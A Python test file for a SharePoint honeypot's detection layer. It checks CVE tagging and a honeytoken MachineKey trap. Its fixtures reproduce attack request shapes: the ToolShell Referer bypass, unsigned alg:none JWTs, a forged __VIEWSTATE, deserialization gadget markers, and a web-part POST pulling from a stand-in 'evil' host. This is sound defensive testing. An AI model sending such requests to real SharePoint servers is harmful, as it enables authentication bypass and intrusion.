"""The SharePoint decoy's detection layering and the MachineKey-honeytoken stage-two check.

Skeleton coverage: surface vs. behaviour vs. candidate CVE (a bare path is recon, not an
exploit), the ToolShell SignOut-Referer bypass tell, the unsigned alg:none JWT, and the
honeytoken payoff — a __VIEWSTATE signed with our fake ValidationKey is CRITICAL stage two.
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json

from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer

from honeylens.honeypots import honeypot_sharepoint as sp
from honeylens.honeypots import sink as real_sink


def _classify(method, path, query="", headers=None, body=b"", vkey=None):
    return sp._classify(method, path, query, headers or {}, body, vkey)


class _CaptureSink:
    """Real build_record envelope, write_record kept in memory (no volume)."""

    def __init__(self):
        self.records: list[dict] = []

    def build_record(self, **kw):
        return real_sink.build_record(**kw)

    def write_record(self, record):
        self.records.append(record)
        return True


def _exchange(method: str, path: str, *, headers=None, data=None):
    """One request against the decoy over a test server; return (resp, record, event)."""
    cap = _CaptureSink()

    async def _main():
        hp = sp.SharePointHoneypot()
        hp._sink = cap  # eventlog stays None -> _emit uses the synchronous sink path
        app = web.Application()
        hp.setup_routes(app)
        client = TestClient(TestServer(app))
        await client.start_server()
        try:
            r = await client.request(
                method, path, headers=headers or {}, data=data, allow_redirects=False
            )
            raw = await r.read()
            return {
                "status": r.status,
                "headers": dict(r.headers),
                "body": raw.decode("utf-8", "replace"),
            }
        finally:
            await client.close()

    resp = asyncio.run(_main())
    rec = cap.records[-1] if cap.records else {}
    return resp, rec, rec.get("event", {})


def test_bare_toolpane_is_recon_not_exploit():
    tag = _classify("GET", "/_layouts/15/ToolPane.aspx")
    assert tag["surface"] == "toolshell-toolpane"
    assert not tag["matches"], "a bare ToolPane visit must not raise a behaviour/CVE"
    assert "attack_type" not in tag


def test_toolshell_signout_referer_bypass_is_tagged():
    tag = _classify(
        "POST",
        "/_layouts/15/ToolPane.aspx",
        query="DisplayMode=Edit&a=/ToolPane.aspx",
        headers={"Referer": "https://host/_layouts/SignOut.aspx"},
    )
    assert tag["attack_type"] == "sp-toolshell-signout-bypass"
    assert tag["severity"] == "HIGH"
    assert "CVE-2025-53770" in tag["rules"]


def test_unsigned_alg_none_jwt_on_api():
    header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(b'{"nameid":"x"}').rstrip(b"=").decode()
    token = f"{header}.{payload}."
    tag = _classify("GET", "/_api/web/currentuser", headers={"Authorization": f"Bearer {token}"})
    assert tag["attack_type"] == "sp-api-unsigned-jwt"
    assert "CVE-2023-29357" in tag["rules"]


def test_signed_api_jwt_is_not_flagged():
    # A normal (not alg:none) Bearer must not fire the bypass behaviour.
    header = base64.urlsafe_b64encode(b'{"alg":"RS256","typ":"JWT"}').rstrip(b"=").decode()
    tag = _classify("GET", "/_api/web", headers={"Authorization": f"Bearer {header}.e30.sig"})
    assert tag["surface"] == "rest-api"
    assert not tag["matches"]


def test_viewstate_signed_with_honeytoken_is_critical_stage_two():
    vkey = "ab" * 64  # 128 hex chars = 64-byte key
    state = b"forged-viewstate-gadget-bytes"
    mac = hmac.new(bytes.fromhex(vkey), state, hashlib.sha256).digest()
    viewstate = base64.b64encode(state + mac).decode()
    body = f"__VIEWSTATE={viewstate}&__VIEWSTATEGENERATOR=ABCD1234".encode()
    tag = _classify("POST", "/default.aspx", body=body, vkey=vkey)
    assert tag["attack_type"] == "sp-viewstate-forged-honeytoken"
    assert tag["severity"] == "CRITICAL"
    assert tag["confidence"] == "high"


def test_viewstate_with_wrong_key_is_not_stage_two():
    state = b"some-viewstate"
    mac = hmac.new(b"\x00" * 64, state, hashlib.sha256).digest()  # not our key
    viewstate = base64.b64encode(state + mac).decode()
    body = f"__VIEWSTATE={viewstate}".encode()
    tag = _classify("POST", "/default.aspx", body=body, vkey="cd" * 64)
    assert not any(m["behaviour"] == "viewstate-forged-honeytoken" for m in tag["matches"])


def test_toolshell_bypass_over_the_wire_serves_200_and_captures_the_tag():
    resp, _rec, event = _exchange(
        "POST",
        "/_layouts/15/ToolPane.aspx?DisplayMode=Edit",
        headers={"Referer": "https://host/_layouts/SignOut.aspx"},
    )
    assert resp["status"] == 200, "anonymous exploit surface: the bypass must get 200, not 401"
    assert resp["headers"].get("MicrosoftSharePointTeamServices"), "IIS/SharePoint identity header"
    assert "CVE-2025-53770" in (event.get("candidate_cves") or [])


def test_capture_is_fail_closed_when_classify_raises(monkeypatch):
    """A classification crash (or crafted input that trips it) must NEVER drop the capture —
    the honeypot's whole job is to record the request. Guards against capture evasion."""

    def boom(*_a, **_k):
        raise RuntimeError("classify blew up")

    monkeypatch.setattr(sp, "_classify", boom)
    resp, rec, event = _exchange("POST", "/_layouts/15/ToolPane.aspx", data=b"payload")
    assert rec, "the request must still be captured when classification fails"
    assert event.get("classify_error") == "RuntimeError"
    assert event.get("method") == "POST"
    assert event.get("path") == "/_layouts/15/ToolPane.aspx"
    assert resp["status"] in (200, 401, 500)  # still answers; capture already happened


def test_spinstall0_honeytoken_matches_toolshell_format():
    """A1/A2: the dump is the pipe-delimited ToolShell shape, 160 chars, no trailing newline,
    both keys 64 hex, and advertises Framework20SP1 (the legacy MAC layout the verifier uses)."""
    vk, dk = "ab" * 32, "cd" * 32  # 64 hex each = 32 bytes
    r = sp_profile_spinstall0(vk, dk)
    body = r.text
    assert body == f"{vk}|HMACSHA256|{dk}|Auto|Framework20SP1"
    assert len(body) == 160
    assert not body.endswith("\n")


def sp_profile_spinstall0(vk, dk):
    from honeylens.honeypots import sharepoint_profile as prof

    return prof.spinstall0_dump(
        "16.0.0.14326", request_guid="x", validation_key=vk, decryption_key=dk
    )


def test_honeytoken_keys_are_32_bytes():
    hp = sp.SharePointHoneypot()
    assert len(hp._vkey) == 64 and len(hp._dkey) == 64  # 64 hex chars = 32 bytes each


def test_ghostfile_never_served_the_machinekey_even_after_flip():
    """A3 + B3: even for a source that exploited ToolPane (flipped), ghostfile* stays an
    implant probe — only spinstall0 ever serves the MachineKey."""
    cap = _CaptureSink()

    async def _main():
        hp = sp.SharePointHoneypot()
        hp._sink = cap
        app = web.Application()
        hp.setup_routes(app)
        client = TestClient(TestServer(app))
        await client.start_server()
        try:
            await (
                await client.request(
                    "POST",
                    "/_layouts/15/ToolPane.aspx?DisplayMode=Edit",
                    data=b"MSOTlPn_DWP=x",
                    allow_redirects=False,
                )
            ).read()  # flip this source
            spin = await client.request(
                "GET", "/_layouts/15/spinstall0.aspx", allow_redirects=False
            )
            sb = (await spin.read()).decode("utf-8", "replace")
            gh = await client.request("GET", "/_layouts/15/ghostfile1.aspx", allow_redirects=False)
            gb = (await gh.read()).decode("utf-8", "replace")
            return sb, gh.status, gb
        finally:
            await client.close()

    sb, gstatus, gb = asyncio.run(_main())
    assert "HMACSHA256" in sb, "spinstall0 serves the key once the source is flipped"
    assert gstatus == 404 and "HMACSHA256" not in gb, "ghostfile never receives the key"


def test_trust_wsfed_binaryformatter_tagged():
    """B1 (CVE-2026-50522): /_trust sign-in with a BinaryFormatter wresult is tagged."""
    body = b"wa=wsignin1.0&wctx=rm&wresult=<t>...ObjectDataProvider...TypeConfuseDelegate...</t>"
    tag = _classify("POST", "/_trust/default.aspx", body=body)
    assert tag["attack_type"] == "sp-trust-wsfed-binaryformatter"
    assert "CVE-2026-50522" in tag["rules"]


def test_trust_signin_without_gadget_is_only_surface():
    """A plain WS-Fed sign-in (no gadget) is recon, not an exploit."""
    tag = _classify("POST", "/_trust/default.aspx", body=b"wa=wsignin1.0&wresult=<normal/>")
    assert tag["surface"] == "sts-trust"
    assert not tag["matches"]


def test_toolshell_webpart_inject_tier_tagged():
    """B2: a ToolPane POST carrying MSOTlPn_DWP/Uri is the stronger web-part-inject tier."""
    tag = _classify(
        "POST", "/_layouts/15/ToolPane.aspx", query="DisplayMode=Edit", body=b"MSOTlPn_DWP=<x/>"
    )
    assert any(m["behaviour"] == "toolshell-webpart-inject" for m in tag["matches"])
    assert tag["severity"] == "HIGH"


def test_honeytoken_state_flip_key_only_after_toolpane_post():
    """B3: spinstall0 serves the key ONLY after a ToolPane POST from the same source."""
    cap = _CaptureSink()

    async def _main():
        hp = sp.SharePointHoneypot()
        hp._sink = cap
        app = web.Application()
        hp.setup_routes(app)
        client = TestClient(TestServer(app))
        await client.start_server()
        try:
            r1 = await client.request("GET", "/_layouts/15/spinstall0.aspx", allow_redirects=False)
            b1 = (await r1.read()).decode("utf-8", "replace")
            await (
                await client.request(
                    "POST",
                    "/_layouts/15/ToolPane.aspx?DisplayMode=Edit",
                    data=b"MSOTlPn_DWP=x",
                    allow_redirects=False,
                )
            ).read()
            r3 = await client.request("GET", "/_layouts/15/spinstall0.aspx", allow_redirects=False)
            b3 = (await r3.read()).decode("utf-8", "replace")
            return r1.status, b1, r3.status, b3
        finally:
            await client.close()

    s1, b1, _s3, b3 = asyncio.run(_main())
    assert s1 == 404 and "HMACSHA256" not in b1, "cold spinstall0 probe must not be served the key"
    assert "HMACSHA256" in b3 and "Framework20SP1" in b3, "key served after the ToolPane exploit"


def test_flip_map_is_bounded_under_flood():
    """B3 resource-exhaustion guard: many distinct sources must not grow the flip map past the
    cap — an internet-facing decoy is hammered 24/7."""
    hp = sp.SharePointHoneypot()
    for i in range(sp._FLIP_MAX + 500):
        hp._record_flip(f"10.{i // 65536 % 256}.{i // 256 % 256}.{i % 256}")
    assert len(hp._flip) <= sp._FLIP_MAX


def test_path_normalization_catches_layouts_16_and_double_slash():
    """B9: /_layouts/16/ and // variants must not evade detection."""
    tag16 = _classify(
        "POST",
        "/_layouts/16/ToolPane.aspx",
        query="DisplayMode=Edit",
        headers={"Referer": "https://h/_layouts/SignOut.aspx"},
    )
    assert tag16["attack_type"] == "sp-toolshell-signout-bypass"
    # a doubled slash on the layouts root still resolves to the surface
    tagslash = _classify("GET", "//_layouts/16//ToolPane.aspx")
    assert tagslash["surface"] == "toolshell-toolpane"
    # webshell under /_layouts/16/ is still caught
    tagws = _classify("GET", "/_layouts/16/spinstall0.aspx")
    assert any(m["behaviour"] == "webshell-aspx" for m in tagws["matches"])


def test_capability_matrix_is_honest_about_no_emulation():
    matrix = sp.capability_matrix()
    assert matrix["CVE-2025-53770"]["surface_served"] is True
    assert all(row["response_emulated"] is False for row in matrix.values())
    # B6: the /_api/contextinfo surface is now served (no behavioural signature of its own).
    assert matrix["CVE-2026-55040"]["surface_served"] is True
    assert matrix["CVE-2026-55040"]["behaviour_signature"] is False
    # B5: gallery endpoints are now a served surface with a heuristic signature.
    assert matrix["CVE-2026-65660"]["surface_served"] is True
    assert matrix["CVE-2026-65660"]["behaviour_signature"] is True


# --- B4: broadened OAuth/JWT auth-bypass detection -------------------------------------


def _bearer(header: dict, payload: dict, sig: str = "sig") -> str:
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    return f"Bearer {h}.{p}.{sig}"


def test_jwt_empty_signature_is_bypass():
    tok = _bearer({"alg": "HS256", "typ": "JWT"}, {"nameid": "x"}, sig="")
    tag = _classify("GET", "/_api/web", headers={"Authorization": tok})
    assert tag["attack_type"] == "sp-api-unsigned-jwt"
    assert "CVE-2023-29357" in tag["rules"]


def test_jwt_x_proof_token_header_is_bypass():
    tag = _classify("GET", "/_api/web", headers={"X-PROOF_TOKEN": "anything"})
    assert tag["attack_type"] == "sp-api-unsigned-jwt"


def test_jwt_principal_in_aud_is_bypass():
    aud = f"{sp.profile.SHAREPOINT_PRINCIPAL}@tenantrealm"
    tok = _bearer({"alg": "RS256", "typ": "JWT"}, {"aud": aud}, sig="realish")
    tag = _classify("GET", "/_api/web", headers={"Authorization": tok})
    assert tag["attack_type"] == "sp-api-unsigned-jwt"


def test_jwt_properly_signed_benign_token_not_flagged():
    tok = _bearer({"alg": "RS256", "typ": "JWT"}, {"aud": "https://example/", "nameid": "u"})
    tag = _classify("GET", "/_api/web", headers={"Authorization": tok})
    assert not tag["matches"]


# --- B8: extended people-picker gadget markers -----------------------------------------


def test_picker_xamlreader_gadget_tagged():
    body = b"<root><ExpandedWrapper><XamlReader/></ExpandedWrapper></root>"
    tag = _classify("POST", "/_layouts/15/Picker.aspx", body=body)
    assert tag["attack_type"] == "sp-picker-xml-deser"
    assert "CVE-2019-0604" in tag["rules"]


# --- B5: gallery web-part RCE / register-smuggle ---------------------------------------


def test_gallery_webpart_rce_tagged():
    tag = _classify(
        "POST",
        "/_layouts/15/AddGallery.aspx",
        query="job=all",
        body=b"MSOTlPn_Uri=http://evil/wp.dwp&MSOTlPn_DWP=<webpart/>",
    )
    assert tag["attack_type"] == "sp-gallery-webpart-rce"
    assert "CVE-2026-65660" in tag["rules"]


def test_duplicate_register_directive_smuggle_tagged():
    body = b"<%@ Register tagprefix=a %>\n<%@ Register tagprefix=b %>\n"
    tag = _classify("POST", "/_layouts/15/MyPage.aspx", body=body)
    assert any(m["behaviour"] == "aspx-register-smuggle" for m in tag["matches"])


def test_oversized_aspx_body_smuggle_tagged():
    body = b"x" * (sp._ASPX_BODY_MAX + 1)
    tag = _classify("POST", "/_layouts/15/MyPage.aspx", body=body)
    assert any(m["behaviour"] == "aspx-register-smuggle" for m in tag["matches"])


def test_normal_small_aspx_post_not_smuggle():
    tag = _classify("POST", "/_layouts/15/MyPage.aspx", body=b"<%@ Register tagprefix=a %>")
    assert not any(m["behaviour"] == "aspx-register-smuggle" for m in tag["matches"])


# --- B6/B7: new served surfaces --------------------------------------------------------


def test_contextinfo_surface_and_response():
    tag = _classify("POST", "/_api/contextinfo")
    assert tag["surface"] == "rest-contextinfo"
    resp, _rec, _ev = _exchange("POST", "/_api/contextinfo")
    assert resp["status"] == 200
    assert "GetContextWebInformation" in resp["body"]
    assert "FormDigestValue" in resp["body"]
    # LibraryVersion agrees with the advertised build (on-wire 16.0.0.14326 -> published 16.0.14326.x)
    assert '"LibraryVersion":"16.0.14326.0"' in resp["body"]


def test_contextinfo_get_is_not_200_context():
    resp, _rec, _ev = _exchange("GET", "/_api/contextinfo")
    assert resp["status"] == 401


def test_spdisco_discovery_document():
    tag = _classify("GET", "/_vti_bin/spdisco.aspx")
    assert tag["surface"] == "fpse-discovery"
    resp, _rec, _ev = _exchange("GET", "/_vti_bin/spdisco.aspx")
    assert resp["status"] == 200
    assert "xml" in resp["headers"].get("Content-Type", "")
    assert "<discovery" in resp["body"] and "contractRef" in resp["body"]


def test_start_aspx_is_served_200():
    tag = _classify("GET", "/_layouts/15/start.aspx")
    assert tag["surface"] == "spa-start"
    resp, _rec, _ev = _exchange("GET", "/_layouts/15/start.aspx")
    assert resp["status"] == 200
    assert "SharePoint" in resp["body"]


# ── fake-vendor WAF canary (deception_waf) ──────────────────────────────────────────────


def _waf_header_item(headers: dict) -> tuple[str, str] | None:
    for k, v in headers.items():
        if k.lower().startswith("x-") and (
            "waf" in k.lower() or "fw" in k.lower() or "gw" in k.lower() or "proxy" in k.lower()
        ):
            return k, v
    return None


def test_waf_canary_header_absent_by_default():
    # Flag defaults to False -> no appliance header leaks into any response.
    resp, _rec, _ev = _exchange("GET", "/_layouts/15/start.aspx")
    assert _waf_header_item(resp["headers"]) is None


def test_waf_canary_header_present_and_per_host_when_enabled(monkeypatch):
    from honeylens import config
    from honeylens.honeypots import deception_waf

    monkeypatch.setattr(config, "WAF_CANARY_ENABLED", True)
    monkeypatch.setattr(config, "SENSOR_HOSTNAME", "unit-test-host")
    monkeypatch.setattr(config, "WAF_CANARY_SALT", "")

    resp, _rec, _ev = _exchange("GET", "/_layouts/15/start.aspx")
    item = _waf_header_item(resp["headers"])
    assert item is not None, "WAF canary header must be attached when enabled"
    name, value = item
    # Deterministic per-host identity: X-<Vendor>-<DDMMYYYY>, vendor from the invented pool.
    assert name == deception_waf.header_name("unit-test-host")
    assert deception_waf.vendor_for_host("unit-test-host") in deception_waf.WAF_VENDORS
    assert "id=" in value and "mode=block" in value
    # It rides on *every* response, not just the loot path (consistency = not a tell).
    resp2, _r2, _e2 = _exchange("GET", "/_vti_bin/spdisco.aspx")
    assert _waf_header_item(resp2["headers"])[0] == name


def test_waf_canary_callback_is_tagged():
    from honeylens.honeypots import deception_waf

    vendor = deception_waf.vendor_for_host("unit-test-host")
    # A client reflects our fictional vendor token back in a later request -> callback.
    tag = _classify("GET", f"/_layouts/15/{vendor}/status", query=f"waf={vendor}")
    assert tag["attack_type"] == "sp-waf-canary-callback"
    assert tag["severity"] == "HIGH"
    assert tag["rules"] == []  # a deception canary carries no CVE


def test_waf_canary_callback_has_no_benign_source():
    # An ordinary request never trips the canary.
    tag = _classify("GET", "/_layouts/15/start.aspx")
    assert tag.get("attack_type") != "sp-waf-canary-callback"


def test_deception_waf_primitives_are_deterministic_and_stable():
    from honeylens.honeypots import deception_waf

    assert deception_waf.vendor_for_host("h1") == deception_waf.vendor_for_host("h1")
    assert deception_waf.header_name("h1").startswith("X-")
    # per-attacker-IP/day nonce is stable for the same inputs, differs by IP
    n1 = deception_waf.header_value("h1", "1.2.3.4", "salt")
    assert n1 == deception_waf.header_value("h1", "1.2.3.4", "salt")
    assert n1 != deception_waf.header_value("h1", "5.6.7.8", "salt")
    assert deception_waf.is_canary_callback(b"GET /CamaraSecWAF/x")
    assert not deception_waf.is_canary_callback(b"GET /_layouts/15/start.aspx")
